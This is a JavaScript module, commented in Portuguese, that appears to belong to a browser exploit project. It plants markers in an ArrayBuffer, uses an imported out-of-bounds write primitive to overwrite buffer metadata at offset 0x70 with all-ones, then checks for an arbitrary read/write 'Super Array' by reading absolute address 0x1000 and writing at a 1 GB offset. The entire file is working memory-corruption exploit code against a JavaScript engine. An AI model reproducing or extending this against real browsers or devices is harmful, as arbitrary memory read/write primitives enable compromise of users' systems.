// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, GB } from '../utils.mjs'; // Adicionado GB
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs'; // Apenas OOB_CONFIG é necessário

const FNAME_SELF_SUPER_ARRAY_TEST = "selfSuperArrayTest_v24a";

const GETTER_SYNC_PROPERTY_NAME = "AAAA_GetterForSync_v24a";
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const MARKER_LOW_OFFSET = 0x100;
const MARKER_LOW_VALUE = 0x12345678;
let MARKER_HIGH_OFFSET; // Será definido com base em ALLOCATION_SIZE
const MARKER_HIGH_VALUE = 0xABCDEF00;

const ABSOLUTE_READ_TEST_ADDR = 0x1000; // Endereço baixo para tentar ler se dataPointer virar 0
const LARGE_OOB_WRITE_TEST_OFFSET = 1 * GB; // 1GB (exemplo de offset muito grande)
const LARGE_OOB_WRITE_VALUE = 0x98765432;

let getter_sync_flag_v24a = false;

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_SELF_SUPER_ARRAY_TEST}: Testar se oob_array_buffer_real se torna Super Array ---`, "test", FNAME_SELF_SUPER_ARRAY_TEST);
    getter_sync_flag_v24a = false;
    MARKER_HIGH_OFFSET = OOB_CONFIG.ALLOCATION_SIZE - 8; // Garantir que está dentro dos limites iniciais

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SELF_SUPER_ARRAY_TEST);

        // FASE 1: Plantar marcadores no oob_array_buffer_real (antes do trigger)
        logS3(`FASE 1: Plantando marcadores...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        oob_write_absolute(MARKER_LOW_OFFSET, MARKER_LOW_VALUE, 4);
        let read_low = oob_read_absolute(MARKER_LOW_OFFSET, 4);
        logS3(`  Marcador Baixo: oob_buffer[${toHex(MARKER_LOW_OFFSET)}] = ${toHex(read_low)} (Esperado: ${toHex(MARKER_LOW_VALUE)})`, read_low === MARKER_LOW_VALUE ? "good" : "error", FNAME_SELF_SUPER_ARRAY_TEST);

        oob_write_absolute(MARKER_HIGH_OFFSET, MARKER_HIGH_VALUE, 4);
        let read_high = oob_read_absolute(MARKER_HIGH_OFFSET, 4);
        logS3(`  Marcador Alto: oob_buffer[${toHex(MARKER_HIGH_OFFSET)}] = ${toHex(read_high)} (Esperado: ${toHex(MARKER_HIGH_VALUE)})`, read_high === MARKER_HIGH_VALUE ? "good" : "error", FNAME_SELF_SUPER_ARRAY_TEST);
        await PAUSE_S3(50);

        // FASE 2: Configurar getter para sincronia
        const getterObject = { get [GETTER_SYNC_PROPERTY_NAME]() { getter_sync_flag_v24a = true; return "sync"; } };

        // FASE 3: Trigger OOB
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SELF_SUPER_ARRAY_TEST);
        await PAUSE_S3(100);

        // FASE 4: Acionar Getter
        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter (sincronia)...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        JSON.stringify(getterObject);
        if(getter_sync_flag_v24a) logS3("  Getter de sincronia acionado.", "info", FNAME_SELF_SUPER_ARRAY_TEST); else logS3("  ALERTA: Getter de sincronia NÃO acionado.", "warn", FNAME_SELF_SUPER_ARRAY_TEST);
        await PAUSE_S3(200);

        // FASE 5: Verificar se oob_array_buffer_real foi alterado (tornou-se "Super Array")
        logS3(`FASE 5: Verificando o estado do oob_array_buffer_real...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);

        // Teste 5a: Leitura de endereço absoluto baixo (ex: 0x1000)
        // Se o dataPointer do oob_array_buffer_real virou 0, oob_read_absolute(0x1000) leria de [0x1000]
        logS3(`  Teste 5a: Tentando ler do endereço absoluto ${toHex(ABSOLUTE_READ_TEST_ADDR)} usando oob_read_absolute...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        try {
            const val_at_abs_addr = oob_read_absolute(ABSOLUTE_READ_TEST_ADDR, 4);
            logS3(`    Valor lido de ${toHex(ABSOLUTE_READ_TEST_ADDR)} (supostamente absoluto): ${toHex(val_at_abs_addr)}`, "leak", FNAME_SELF_SUPER_ARRAY_TEST);
            document.title = `Leu Abs ${toHex(ABSOLUTE_READ_TEST_ADDR)}=${toHex(val_at_abs_addr)}`;
        } catch (e) {
            logS3(`    Erro ao tentar ler de endereço absoluto ${toHex(ABSOLUTE_READ_TEST_ADDR)}: ${e.message}`, "warn", FNAME_SELF_SUPER_ARRAY_TEST);
            document.title = "Erro Leitura Absoluta";
        }

        // Teste 5b: Verificar marcadores plantados
        logS3(`  Teste 5b: Verificando marcadores originais...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        try {
            read_low = oob_read_absolute(MARKER_LOW_OFFSET, 4);
            logS3(`    Marcador Baixo (após trigger): oob_buffer[${toHex(MARKER_LOW_OFFSET)}] = ${toHex(read_low)} (Original: ${toHex(MARKER_LOW_VALUE)})`, read_low === MARKER_LOW_VALUE ? "good" : "warn", FNAME_SELF_SUPER_ARRAY_TEST);
        } catch (e) { logS3(`    Erro ao reler marcador baixo: ${e.message}`, "error", FNAME_SELF_SUPER_ARRAY_TEST); }
        try {
            read_high = oob_read_absolute(MARKER_HIGH_OFFSET, 4);
            logS3(`    Marcador Alto (após trigger): oob_buffer[${toHex(MARKER_HIGH_OFFSET)}] = ${toHex(read_high)} (Original: ${toHex(MARKER_HIGH_VALUE)})`, read_high === MARKER_HIGH_VALUE ? "good" : "warn", FNAME_SELF_SUPER_ARRAY_TEST);
        } catch (e) { logS3(`    Erro ao reler marcador alto: ${e.message}`, "error", FNAME_SELF_SUPER_ARRAY_TEST); }


        // Teste 5c: Tentar escrever e ler em um offset massivamente OOB
        logS3(`  Teste 5c: Tentando R/W em offset muito grande (${toHex(LARGE_OOB_WRITE_TEST_OFFSET)})...`, "info", FNAME_SELF_SUPER_ARRAY_TEST);
        try {
            oob_write_absolute(LARGE_OOB_WRITE_TEST_OFFSET, LARGE_OOB_WRITE_VALUE, 4);
            const read_large_oob = oob_read_absolute(LARGE_OOB_WRITE_TEST_OFFSET, 4);
            if (read_large_oob === LARGE_OOB_WRITE_VALUE) {
                logS3(`    !!!! SUCESSO !!!! Escrita/Leitura em offset ${toHex(LARGE_OOB_WRITE_TEST_OFFSET)} funcionou! oob_array_buffer_real É um Super Array!`, "vuln", FNAME_SELF_SUPER_ARRAY_TEST);
                document.title = "OOB_BUFFER É SUPER ARRAY!!!";
            } else {
                logS3(`    Falha na R/W em offset grande. Lido: ${toHex(read_large_oob)}, Esperado: ${toHex(LARGE_OOB_WRITE_VALUE)}`, "warn", FNAME_SELF_SUPER_ARRAY_TEST);
                document.title = "Falha R/W Grande Offset";
            }
        } catch (e) {
            logS3(`    Erro ao tentar R/W em offset grande: ${e.message}`, "error", FNAME_SELF_SUPER_ARRAY_TEST);
            if (!document.title.includes("Absoluta")) document.title = "Erro R/W Grande Offset";
        }

        logS3("Verificação do oob_array_buffer_real concluída.", "test", FNAME_SELF_SUPER_ARRAY_TEST);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SELF_SUPER_ARRAY_TEST}: ${e.message}`, "critical", FNAME_SELF_SUPER_ARRAY_TEST);
        document.title = `${FNAME_SELF_SUPER_ARRAY_TEST} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SELF_SUPER_ARRAY_TEST} Concluído ---`, "test", FNAME_SELF_SUPER_ARRAY_TEST);
    }
}
